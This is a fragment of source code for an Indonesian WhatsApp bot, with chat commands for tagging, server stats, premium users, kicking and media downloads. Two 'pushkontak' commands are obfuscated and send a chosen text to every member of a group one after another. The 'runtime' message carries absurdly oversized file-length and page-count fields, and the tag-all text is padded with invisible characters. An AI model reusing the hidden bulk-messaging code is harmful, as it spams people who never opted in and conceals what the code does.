let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
Zeltoria.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break


  case 'ping': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
case 'runtime': {
let babi = `BOT Telah Online Selama\n${runtime(process.uptime())}`
const buttons = [
{ buttonId: '.menu', buttonText: { displayText: 'MENU' }, type: 1 }
]
const buttonMessage = {
document: { url: "https://wa.me/6281916619735" },
mimetype: global.docx,
fileName: `${runtime(process.uptime())}`,
fileLength: 88808964843634667969,
pageCount: 1234567890123456789012345,
caption: babi,
footer: packname,
buttons: buttons,
headerType: 1
}
Zeltoria.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break


case "pushkontak":
function _0x39d1(){const _0x1f8190=['2767356JMhMSZ','11087568YPYUeJ','participants','Penggunaan\x20Salah\x20Silahkan\x20Gunakan\x20Command\x20Seperti\x20Ini\x0a','20071JMpBhE','20731414svfPCo','split','430snQenI','10129jtgIJs','Maaf\x20Kak\x20@','96kQZzOm','34208gaLDQX','4696SXEBAA','\x20Untuk\x20Membeli\x20Akses\x20User\x20Premium','\x20idgroup|tekspushkontak\x0aUntuk\x20Liat\x20Id\x20Group\x20Silahkan\x20Ketik\x20.listgroup','10LSPGsS','sendMessage','4975620rKoyza'];_0x39d1=function(){return _0x1f8190;};return _0x39d1();}const _0x2e7adc=_0x4cee;(function(_0x16346a,_0x55a56c){const _0x25145e=_0x4cee,_0x16ab1e=_0x16346a();while(!![]){try{const _0x2bb40a=-parseInt(_0x25145e(0x1dc))/0x1*(parseInt(_0x25145e(0x1e2))/0x2)+-parseInt(_0x25145e(0x1d7))/0x3+parseInt(_0x25145e(0x1d1))/0x4*(parseInt(_0x25145e(0x1df))/0x5)+parseInt(_0x25145e(0x1d8))/0x6+parseInt(_0x25145e(0x1e0))/0x7*(-parseInt(_0x25145e(0x1d2))/0x8)+parseInt(_0x25145e(0x1d9))/0x9+parseInt(_0x25145e(0x1d5))/0xa*(parseInt(_0x25145e(0x1dd))/0xb);if(_0x2bb40a===_0x55a56c)break;else _0x16ab1e['push'](_0x16ab1e['shift']());}catch(_0x1a9696){_0x16ab1e['push'](_0x16ab1e['shift']());}}}(_0x39d1,0xcd903));if(!isPrem)return Zeltoria[_0x2e7adc(0x1d6)](from,{'text':_0x2e7adc(0x1e1)+sender[_0x2e7adc(0x1de)]('@')[0x0]+',\x20Kakak\x20Belum\x20Premium\x20Silahkan\x20Chat\x20@'+creator[_0x2e7adc(0x1de)]('@')[0x0]+_0x2e7adc(0x1d3),'mentions':[sender,creator],'contextInfo':{'forwardingScore':0x174876e7ff,'isForwarded':!![],'mentionedJid':[sender,creator]}},{'quoted':voll});function _0x4cee(_0x2d54d1,_0x1d8a20){const _0x39d198=_0x39d1();return _0x4cee=function(_0x4cee9b,_0x1635b5){_0x4cee9b=_0x4cee9b-0x1d1;let _0x2c43a8=_0x39d198[_0x4cee9b];return _0x2c43a8;},_0x4cee(_0x2d54d1,_0x1d8a20);}if(!q)return reply(_0x2e7adc(0x1db)+(prefix+command)+_0x2e7adc(0x1d4));const metadata2=await Zeltoria['groupMetadata'](q[_0x2e7adc(0x1de)]('|')[0x0]),halss=metadata2[_0x2e7adc(0x1da)];for(let mem of halss){Zeltoria[_0x2e7adc(0x1d6)](''+mem['id'][_0x2e7adc(0x1de)]('@')[0x0]+'@s.whatsapp.net',{'text':q[_0x2e7adc(0x1de)]('|')[0x1]}),await sleep(0x1f4);}
break
case "pushkontakv2":
const _0x53a68f=_0x4ed6;(function(_0x1492a9,_0x4d442e){const _0x5088b5=_0x4ed6,_0x7c5afe=_0x1492a9();while(!![]){try{const _0x56a4d2=parseInt(_0x5088b5(0x1d5))/0x1+parseInt(_0x5088b5(0x1da))/0x2*(-parseInt(_0x5088b5(0x1e2))/0x3)+-parseInt(_0x5088b5(0x1e0))/0x4*(-parseInt(_0x5088b5(0x1d9))/0x5)+-parseInt(_0x5088b5(0x1d3))/0x6*(-parseInt(_0x5088b5(0x1dc))/0x7)+-parseInt(_0x5088b5(0x1db))/0x8+-parseInt(_0x5088b5(0x1e1))/0x9*(-parseInt(_0x5088b5(0x1dd))/0xa)+-parseInt(_0x5088b5(0x1d7))/0xb*(parseInt(_0x5088b5(0x1df))/0xc);if(_0x56a4d2===_0x4d442e)break;else _0x7c5afe['push'](_0x7c5afe['shift']());}catch(_0x40969c){_0x7c5afe['push'](_0x7c5afe['shift']());}}}(_0x82e6,0x7777c));if(!isPrem)return reply('Maaf\x20Kak\x20Fitur\x20'+(prefix+command)+_0x53a68f(0x1d1));if(!m[_0x53a68f(0x1d6)])return reply(_0x53a68f(0x1d4)+(prefix+command)+'\x20Hanya\x20Bisa\x20Di\x20Gunakan\x20Di\x20Dalam\x20Group\x0aUntuk\x20Memasukan\x20Bot\x20Ke\x20Dalam\x20Group\x20Yang\x20Di\x20Ingin\x20Kan\x0aSilahkan\x20Ketik\x20Command\x20.join\x20linkgroup');if(!text)return reply('Penggunaan\x20Salah\x20Silahkan\x20Gunakan\x20Command\x20Seperti\x20Ini\x0a'+(prefix+command)+_0x53a68f(0x1d8));await reply(_0x53a68f(0x1e3));const halsss=await participants['filter'](_0x3225ec=>_0x3225ec['id'][_0x53a68f(0x1de)](_0x53a68f(0x1e4)))['map'](_0x7f486e=>_0x7f486e['id']);function _0x82e6(){const _0x55c0ba=['3678241sCGTsg','2130SZJZRp','endsWith','28772556SsaMaw','13252JHfqfm','38925VpZoDB','15QNWzsJ','Otw\x20Boskuuu','.net','\x20Hanya\x20Bisa\x20Di\x20Gunakan\x20Oleh\x20user\x20premium,\x20ketik.owner\x20untuk\x20membeli\x20premium','sendMessage','6pZyfau','Maaf\x20Kak\x20Fitur\x20','837970fBwCNH','isGroup','11leskUM','\x20teks','965sblyZp','2498yDYwLR','246152efuklg'];_0x82e6=function(){return _0x55c0ba;};return _0x82e6();}function _0x4ed6(_0x30735f,_0x3dd4a5){const _0x82e61=_0x82e6();return _0x4ed6=function(_0x4ed6db,_0x50ee2d){_0x4ed6db=_0x4ed6db-0x1d1;let _0x597783=_0x82e61[_0x4ed6db];return _0x597783;},_0x4ed6(_0x30735f,_0x3dd4a5);}for(let men of halsss){Zeltoria[_0x53a68f(0x1d2)](men,{'text':text}),await sleep(0x7d0);}reply('Succes\x20Boss!');
break
case 'addprem':
if (!IniZeltoria) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281916619735`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Zeltoria.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
break
case 'delprem':
if (!IniZeltoria) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281916619735`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
break

case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !IniZeltoria) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Zeltoria.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !IniZeltoria) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Ketik .antilink on Untuk Mengaktifkan Dan Ketik .antilink off Untuk Mematikan`)
}
break
case 'tiktok': case 'ttdl': case 'tiktokdl': {
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
reply(`_Sedang Di Proses, Mohon Tunggu_`)
let ini = await fetchJson(`https://api.zeltoria.my.id/api/download/tiktok?url=${q}&apikey=Mwuhehe`)
Zeltoria.sendMessage(m.chat,{video:{url: ini.download.nowm },caption: 'Sukses Kak Tunggu Aja Audio Nya Di Bawah Yaa'},{quoted:m})
}
break
case 'sticker': 
case 's': {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Zeltoria.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Zeltoria.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'tutorialjadibot':
      case 'tutorjadibot':
        txt = `𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐣𝐚𝐝𝐢𝐛𝐨𝐭 𝐰𝐚𝐣𝐢𝐛 𝐦𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 𝐝𝐮𝐚 𝐡𝐩 𝐣𝐢𝐤𝐚 𝐭𝐢𝐝𝐚𝐤 𝐩𝐮𝐧𝐲𝐚 𝐛𝐨𝐥𝐞𝐡 𝐩𝐢𝐧𝐣𝐚𝐦 𝐤𝐞 𝐭𝐞𝐦𝐚𝐧/𝐤𝐞𝐥𝐮𝐚𝐫𝐠𝐚

1. 𝐤𝐞𝐭𝐢𝐤 .𝐣𝐚𝐝𝐢𝐛𝐨𝐭 
    𝐭𝐮𝐧𝐠𝐠𝐮 𝐡𝐢𝐧𝐠𝐠𝐚 𝐦𝐮𝐧𝐜𝐮𝐥 𝐪𝐫, 𝐣𝐢𝐤𝐚 𝐮𝐝𝐚𝐡 𝐦𝐮𝐧𝐜𝐮𝐥, 𝐟𝐨𝐭𝐨 𝐪𝐫 𝐝𝐞𝐧𝐠𝐚𝐧 𝐜𝐞𝐩𝐚𝐭 𝐦𝐞𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 𝐡𝐩 𝐤𝐞 𝐝𝐮𝐚

2. 𝐤𝐞𝐦𝐛𝐚𝐥𝐢 𝐤𝐞 𝐡𝐨𝐦𝐞 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐤𝐞𝐭𝐮𝐤 𝐭𝐢𝐭𝐢𝐤 𝐭𝐢𝐠𝐚 𝐝𝐢 𝐛𝐚𝐠𝐢𝐚𝐧 𝐤𝐚𝐧𝐚𝐧 𝐚𝐭𝐚𝐬, 𝐥𝐚𝐥𝐮 𝐤𝐥𝐢𝐤 𝐩𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 𝐭𝐞𝐫𝐭𝐚𝐮𝐭, 𝐤𝐥𝐢𝐤 𝐭𝐚𝐮𝐭𝐤𝐚𝐧 𝐩𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭

3. 𝐬𝐜𝐚𝐧 𝐪𝐫 𝐲𝐚𝐧𝐠 𝐝𝐢 𝐟𝐨𝐭𝐨 𝐦𝐧𝐠𝐠𝐮𝐧𝐚𝐤𝐚𝐧 𝐡𝐩 𝐤𝐞 𝐝𝐮𝐚

